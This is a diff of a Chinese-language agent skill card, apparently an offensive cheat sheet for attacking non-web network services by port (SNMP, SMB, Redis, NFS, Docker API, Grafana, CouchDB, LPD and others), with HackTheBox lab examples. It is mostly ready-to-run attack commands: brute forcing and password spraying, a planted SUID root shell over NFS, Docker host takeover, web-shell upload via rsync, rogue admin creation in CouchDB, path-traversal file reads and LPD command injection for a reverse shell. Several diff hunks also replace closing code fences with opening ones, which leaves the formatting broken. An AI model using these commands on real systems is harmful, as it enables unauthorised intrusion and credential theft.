@@ -4,7 +4,7 @@ description: '非 Web 服务攻击速查：41 端口覆盖。按端口号索引�
 whenToUse: '非 Web 端口需要攻击速查时：按端口号索引定位枚举→利用→验证。'
 metadata: { domain: network, tier: T1 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：用 skill 工具按名加载本卡。
 
 # 非 Web 服务攻击速查
 
@@ -61,7 +61,7 @@ metadata: { domain: network, tier: T1 }
 
 ## SNMP (161/162)
 
-```
+```text
 # 枚举 — community string: public / private / manager
 snmpwalk -v1 -c public <IP>                  # 全量 walk
 snmpwalk -v1 -c public <IP> 1.3.6.1.2.1.25.4.2.1.2  # 进程列表
@@ -72,13 +72,13 @@ snmp-check <IP> -c public                     # 一键枚举
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
 
 # 泄漏源: 用户名 / 进程 / 网络拓扑 / 内网 IP / 软件版本
-```
+```text
 
 ---
 
 ## SMB (139/445) — 🔴 HTB 最常见非 Web 入口
 
-```
+```text
 # 匿名列出共享
 smbclient -N -L //<IP>                    # 空密码列表
 smbmap -H <IP>                            # 带权限标注
@@ -98,13 +98,13 @@ smbclient //<IP>/share -U user%pass        # 凭据连接
 
 # 凭据喷洒
 netexec smb <IP> -u users.txt -p passwords.txt --no-bruteforce
-```
+```text
 
 ---
 
 ## DNS (53)
 
-```
+```text
 # Zone Transfer — AXFR 未限制
 dig axfr @<DNS_IP> <domain>
 host -l <domain> <DNS_IP>
@@ -126,13 +126,13 @@ dig -x <IP> @<DNS_IP>
 dnsrecon -d <domain> -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 
 # 🔴 泄露: 子域名 / 内网 IP / SRV / 邮件服务器 / SPF
-```
+```text
 
 ---
 
 ## LDAP (389)
 
-```
+```text
 # 匿名 bind — 不认证查询
 ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=htb"
 ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=htb" "(objectClass=*)"
@@ -146,13 +146,13 @@ ldapsearch -H ldap://<IP> -x -s base namingcontexts
 
 nmap -p 389 --script ldap-search <IP>
 # 详细 AD LDAP → ad-checklist §1
-```
+```text
 
 ---
 
 ## FTP (21)
 
-```
+```bash
 ftp <IP>                              # anonymous / 空密码
 # 登录后: ls -la / binary / passive / get <file> / put <file>
 # 🔴 mget * — 批量下载当前目录所有文件
@@ -164,13 +164,13 @@ lftp -e "mirror --verbose / ./loot/; quit" ftp://anonymous:@<IP>/
 
 # FTP Bounce
 nmap -b anonymous:anonymous@<IP>:21 -p 22,80,445 <internal_ip>
-```
+```text
 
 ---
 
 ## SMTP (25)
 
-```
+```text
 # 用户枚举
 smtp-user-enum -M VRFY -U users.txt -t <IP>
 smtp-user-enum -M RCPT -U users.txt -t <IP>
@@ -188,13 +188,13 @@ RCPT TO: user@domain.htb
 
 # 邮件伪造
 swaks --to victim@domain.htb --from admin@domain.htb --server <IP> --body "test"
-```
+```text
 
 ---
 
 ## POP3 (110/995) / IMAP (143/993)
 
-```
+```text
 # POP3 — 邮件收取 (邮件存在服务器，下载后删除)
 nc <IP> 110
 USER <username>
@@ -216,13 +216,13 @@ a6 LOGOUT
 # 自动化
 hydra -l user -P wordlist pop3://<IP>
 hydra -l user -P wordlist imap://<IP>
-```
+```text
 
 ---
 
 ## Finger (79)
 
-```
+```text
 # 用户枚举 — 列出登录用户
 finger @<IP>                       # 所有在线用户
 finger admin@<IP>                  # 指定用户详情
@@ -230,13 +230,13 @@ finger 0@<IP>                      # 全系统用户 (部分实现)
 
 # 用 finger-user-enum
 finger-user-enum -U users.txt -t <IP>
-```
+```text
 
 ---
 
 ## Telnet (23)
 
-```
+```text
 # 弱密码 + 明文流量
 nc <IP> 23                         # 交互登录
 # 🔴 流量不加密 → tcpdump/Wireshark 直接看到密码
@@ -255,13 +255,13 @@ hydra -l root -P passwords.txt telnet://<IP>
 
 # 🆕 Orion HTB 案例: 自定义 telnetd + -E exec-login → CVE-2026-24061 auth bypass
 # 拿到 adam 密码 → SSH → ss -tlnp → 23 端口 → 搜 "CVE telnetd" → 秒出
-```
+```text
 
 ---
 
 ## Redis (6379)
 
-```
+```text
 # 检测无认证
 redis-cli -h <IP> INFO             # 无密码直连 → 返回版本信息
 
@@ -290,13 +290,13 @@ save
 
 # 验证
 redis-cli -h <IP> config get dir   # 确认写入路径
-```
+```text
 
 ---
 
 ## IPMI (623)
 
-```
+```text
 # 检测版本
 nmap -sU -p 623 --script ipmi-version <IP>
 
@@ -313,13 +313,13 @@ ipmitool -H <IP> -U admin -P <password> sol activate  # Serial over LAN
 
 # 🔴 BMC 密码 → 常复用为 OS root/Administrator 密码
 # 🔴 Serial over LAN → OS 挂了也能拿 shell
-```
+```text
 
 ---
 
 ## rsync (873)
 
-```
+```text
 # 匿名列表
 rsync rsync://<IP>/
 rsync rsync://<IP>/module/
@@ -331,13 +331,13 @@ rsync -av rsync://<IP>/module/ ./loot/
 rsync -av shell.php rsync://<IP>/module/www/shell.php
 
 # 🔴 常见发现: 配置文件 / 源码 / SSH key / 数据库备份
-```
+```text
 
 ---
 
 ## MongoDB (27017)
 
-```
+```text
 # 无认证连接
 mongo --host <IP> --port 27017
 mongosh <IP>:27017
@@ -353,13 +353,13 @@ db.<collection>.find().pretty()
 mongodump --host <IP> --port 27017
 
 # 有密码: mongodump -u user -p pass --host <IP> --authenticationDatabase admin
-```
+```text
 
 ---
 
 ## Memcached (11211)
 
-```
+```text
 # 检测
 nc <IP> 11211
 stats
@@ -372,13 +372,13 @@ memccat --servers=<IP> <key>            # 读指定 key 值
 
 # 🔴 常见泄露: PHP session / 框架缓存 token / API key
 # 注意: Memcached 不加密，所有数据明文存储
-```
+```text
 
 ---
 
 ## 🆕 MQTT (1883/8883)
 
-```
+```text
 # 检测
 nmap -sV -p 1883,8883 <IP>
 
@@ -395,7 +395,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt mqtt://<IP>
 
 # 🔴 常见泄露: 内网 IP / vhost / 凭据 / 系统健康状态 / C2 通信
 # 🔴 常见密码: admin/admin, 空密码, 服务名重复
-```
+```text
 
 ---
 
@@ -403,7 +403,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt mqtt://<IP>
 
 ### RPC (111)
 
-```
+```text
 # 枚举 RPC 服务
 rpcinfo -p <IP>
 
@@ -415,11 +415,11 @@ rpcclient -U '' -N <IP>                     # 空字符串用户
 > querygroup <RID>    # 组成员
 > lsaenumsid          # SID 枚举
 > lookupnames <user>  # SID 查询
-```
+```text
 
 ### NFS (2049)
 
-```
+```text
 # 列出共享
 showmount -e <IP>
 
@@ -430,11 +430,11 @@ mount -t nfs <IP>:/share /mnt/nfs -o nolock
 # 🔴 no_root_squash → UID 0 的文件当 root
 # 攻击: 本地创建 SUID bash，UID=0 拥有者，放 NFS 共享，目标执行→root
 cp /bin/bash /mnt/nfs/bash; chown 0:0 /mnt/nfs/bash; chmod 4755 /mnt/nfs/bash
-```
+```text
 
 ---
 ## MySQL (3306)
-```
+```text
 # 无密码连接
 mysql -h <IP> -u root
 
@@ -446,11 +446,11 @@ mysql -h <IP> -u root
 # 注意: PHP代码内双引号需转义或改用单引号包裹
 
 # 爆破: hydra -l root -P passwords.txt mysql://<IP>
-```
+```text
 
 ---
 ## WinRM (5985/5986)
-```
+```text
 # 密码认证
 evil-winrm -i <IP> -u user -p 'pass'
 
@@ -468,11 +468,11 @@ netexec winrm <IP> -u user -p pass -x 'whoami'
 
 # 🔴 目标用户需在 Remote Management Users 组
 # 详细横向 → lateral-movement skill
-```
+```text
 
 ---
 ## RDP (3389)
-```
+```text
 # 密码登录
 xfreerdp /v:<IP> /u:user /p:'pass' /cert:ignore +clipboard
 
@@ -487,7 +487,7 @@ xfreerdp /v:<IP> /u:user /p:'pass' /cert:ignore \
 nmap -p 3389 --script rdp-ntlm-info <IP>
 
 # 🔴 BlueKeep (CVE-2019-0708) — 老 Windows 7/2008 R2
-```
+```text
 
 ---
 
@@ -495,17 +495,17 @@ nmap -p 3389 --script rdp-ntlm-info <IP>
 
 ### Docker API (2375/2376)
 
-```
+```text
 # 未认证 Docker daemon
 curl http://<IP>:2375/containers/json
 docker -H tcp://<IP>:2375 ps
 docker -H tcp://<IP>:2375 run -v /:/host -it alpine chroot /host /bin/bash
 # 🔴 等价于 root — Docker daemon 以 root 运行
-```
+```text
 
 ### Jenkins (8080/50000)
 
-```
+```text
 # 默认凭据
 admin:admin / admin:password / jenkins:jenkins
 
@@ -518,31 +518,31 @@ admin:admin / admin:password / jenkins:jenkins
 
 # Jenkins CLI (50000)
 java -jar jenkins-cli.jar -s http://<IP>:8080 who-am-i
-```
+```text
 
 ### ActiveMQ (61616)
 
-```
+```text
 # 🔴 CVE-2023-46604 OpenWire 反序列化 RCE
 # 无需认证 → 直传恶意序列化对象 → 命令执行
 # GitHub: git@github.com:SleepingBag945/CVE-2023-46604.git
 
 # 检测
 nc <IP> 61616                         # ActiveMQ | OpenWire
-```
+```text
 
 ### AJP (8009) — Apache JServ Protocol
 
-```
+```text
 # 🔴 Ghostcat (CVE-2020-1938) → 读 Tomcat WEB-INF 任意文件
 # AJP 协议默认只允许 localhost (8009 对外 = 配置错误)
 python3 ghostcat.py <IP> 8009 /WEB-INF/web.xml
 # → 泄露 web.xml → 发现 servlet 映射 / 凭据
-```
+```text
 
 ### VNC (5900)
 
-```
+```text
 # 检测 — 无需连接
 nmap -p 5900 --script vnc-info <IP>
 nmap -p 5900 --script vnc-title <IP>
@@ -555,42 +555,42 @@ hydra -P /usr/share/wordlists/rockyou.txt vnc://<IP>
 vncviewer <IP>::5900
 echo '<password>' | vncviewer <IP>::5900 -autopass
 xtightvncviewer <IP>::5900 -autopass
-```
+```text
 
 ### IPP/CUPS (631)
 
-```
+```text
 # 打印机先枚举
 curl http://<IP>:631/printers
 curl http://<IP>:631/admin
 cupsctl --server <IP>:631           # CUPS 配置
 
 # 🔴 CUPS vulnerabilities: CVE-2024-47176 (browse port) / CVE-2024-47076
-```
+```text
 
 ### Grafana (3000)
 
-```
+```text
 # 默认凭据: admin:admin
 # 🔴 CVE-2021-43798: /public/plugins/<plugin>/../../etc/grafana/grafana.ini
 # → 未认证 LFI → 读取配置文件 → 含 SMTP 密码 / 数据库凭据
 curl http://<IP>:3000/public/plugins/alertlist/..%2F..%2F..%2F..%2F..%2Fetc/grafana/grafana.ini
-```
+```text
 
 ### Elasticsearch (9200)
 
-```
+```text
 # 无认证 → dump 数据
 curl http://<IP>:9200/_cat/indices?v      # 列出所有索引
 curl http://<IP>:9200/<index>/_search?q=*  # dump 全部数据
 curl http://<IP>:9200/_nodes               # 节点信息
 
 # 🔴 常见泄露: 用户数据 / API key / 内部文档
-```
+```text
 
 ### CouchDB (5984)
 
-```
+```text
 # 无认证
 curl http://<IP>:5984/_all_dbs
 curl http://<IP>:5984/_users
@@ -600,11 +600,11 @@ curl -X PUT http://<IP>:5984/_users/org.couchdb.user:evil \
   -H "Content-Type: application/json" \
   -d '{"type":"user","name":"evil","roles":["_admin"],"password":"pwned"}'
 # → admin 创建成功 → 登录 /_utils → 全库读写
-```
+```text
 
 ### Oracle DB (1521)
 
-```
+```text
 # 枚举
 oscanner -s <IP>                     # SIET infosec oracle scanner
 nmap -p 1521 --script oracle-sid-brute <IP>
@@ -612,22 +612,22 @@ nmap -p 1521 --script oracle-sid-brute <IP>
 # ODAT (Oracle Database Attacking Tool)
 odat all -s <IP>                     # 全模块自动探测
 odat passwordguesser -s <IP> -d <SID>  # 密码爆破
-```
+```text
 
 ### Java RMI (1099/1098)
 
-```
+```text
 # 枚举 RMI Registry
 rmiregistry -l <IP> 1099             # 列出注册的对象
 nmap -p 1099 --script rmi-dumpregistry <IP>
 
 # 🔴 反序列化 RCE (如果注册表中有危险对象)
 # 工具: BaRMIe / rmiscout
-```
+```text
 
 ### Solr (8983)
 
-```
+```text
 # 默认无认证
 curl http://<IP>:8983/solr/admin/cores     # 列出 cores
 curl http://<IP>:8983/solr/<core>/config    # 配置
@@ -636,19 +636,19 @@ curl http://<IP>:8983/solr/<core>/config    # 配置
 curl http://<IP>:8983/solr/<core>/config -d '{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
 
 # 🔴 Config API → 创建恶意 core → RCE
-```
+```text
 
 ### Splunk (8089)
 
-```
+```text
 # 默认凭据: admin:changeme / admin:admin
 # 管理员 → Apps → Install App from File → 上传恶意 .tar.gz
 # .tar.gz 含 payload.py → 内置 import subprocess → 拿到 shell
-```
+```text
 
 ### Vault (8200)
 
-```
+```text
 # 检测 seal 状态 — unsealed / sealed
 curl http://<IP>:8200/v1/sys/seal-status
 
@@ -656,21 +656,21 @@ curl http://<IP>:8200/v1/sys/seal-status
 curl -H "X-Vault-Token: <TOKEN>" http://<IP>:8200/v1/secret/metadata?list=true
 
 # 🔴 沿 KV 路径读 secrets → 任何凭据都可能存在 (DB/AWS/AD)
-```
+```text
 
 ### Prometheus (9090)
 
-```
+```text
 # 无认证 → 通读 metrics
 curl http://<IP>:9090/api/v1/query?query=up
 curl http://<IP>:9090/api/v1/label/__name__/values  # 所有 metric names
 
 # 🔴 泄露: 内网 IP / 服务名 / 环境变量 / alertmanager 配置
-```
+```text
 
 ### K8s API (6443/10250)
 
-```
+```text
 # 6443 → 需要 SA token → 尝试 /version
 curl -k https://<IP>:6443/version
 
@@ -678,25 +678,23 @@ curl -k https://<IP>:6443/version
 curl -k https://<IP>:10250/pods
 
 # 🔴 详细逃逸: container-escape §K8s
-```
+```text
 
 ### OPC UA (4840)
 
-```
+```text
 # 工业协议 — Helix HTB 案例
 # 工具: opcua-client / python-opcua
 # 用 opcua-client/python-opcua 枚举节点与变量 → 找敏感信息/凭据
-```
+```text
 
 ### PostgreSQL (5432) / MSSQL (1433)
 
-```
+```text
 # → 已有独立记忆 postgresql-rce / mssql-attack-chain
 # nmap 脚本: nmap -p 5432 --script postgres-brute <IP>
 #             nmap -p 1433 --script ms-sql-info <IP>
-```
-
----
+```text
 
 ---
 
@@ -704,7 +702,7 @@ curl -k https://<IP>:10250/pods
 
 ### 证书信息泄露 — 🔴 最容易漏的攻击面
 
-```
+```text
 # nmap -sC 输出的 ssl-cert 脚本 → 不要跳过！
 # Subject CN / SAN / Issuer → 藏着内部域名和组织结构
 
@@ -717,7 +715,7 @@ nmap -p PORT --script ssl-cert IP
 #   DNS:dev.htb, DNS:api.htb → SAN → 多个子域全加
 #   Email: admin@domain → 用户名格式 → 密码喷洒用
 #   Issuer: CN=ca.internal.corp → 可能内部 CA → ADCS 攻击面
-```
+```text
 
 ### 协议版本漏洞（罕见但秒杀）
 
@@ -725,7 +723,7 @@ nmap -p PORT --script ssl-cert IP
 nmap -p 443 --script ssl-heartbleed,ssl-poodle IP
 # Heartbleed → 内存泄露 → 私钥/session/密码
 # POODLE → SSLv3 padding oracle
-```
+```text
 
 ---
 
@@ -774,7 +772,7 @@ nmap -p 443 --script ssl-heartbleed,ssl-poodle IP
 
 ## 🆕 LPD — Line Printer Daemon (515/1515)
 
-```
+```text
 # 🔴 RFC 1179 协议 — 常见于 HTB Linux 靶机
 
 # 队列状态 (短/长):
@@ -813,11 +811,11 @@ s.close()
 # ② 注入用 ; 无条件分隔，不要用 || (echo 返回 0)
 # ③ 下载的 server.py 可能有 bug (缺 import)，不代表运行版本
 # 要点: J 字段 shell=True 注入 → 直接反弹 shell（Popen 非阻塞，用 OOB 验证）
-```
+```text
 
 ## 🆕 PJL / JetDirect (9100)
 
-```
+```text
 # 🔴 HP Printer Job Language — 自定义文件系统读写
 # ⚠️ 9100 常绑定在 127.0.0.1 → 外部不可达!
 #    → 拿 shell 后 ss -tlnp → 127.0.0.1:9100 → 从目标本地连接
@@ -849,4 +847,4 @@ s.close()
 # 从少到多试: ../ → ../../ → ../../../
 # FSDOWNLOAD → os.makedirs(dirname, exist_ok=True) → 自动创建目录!
 # 要点: FSDOWNLOAD 写 .ssh/authorized_keys → SSH 直连
-```
+```text
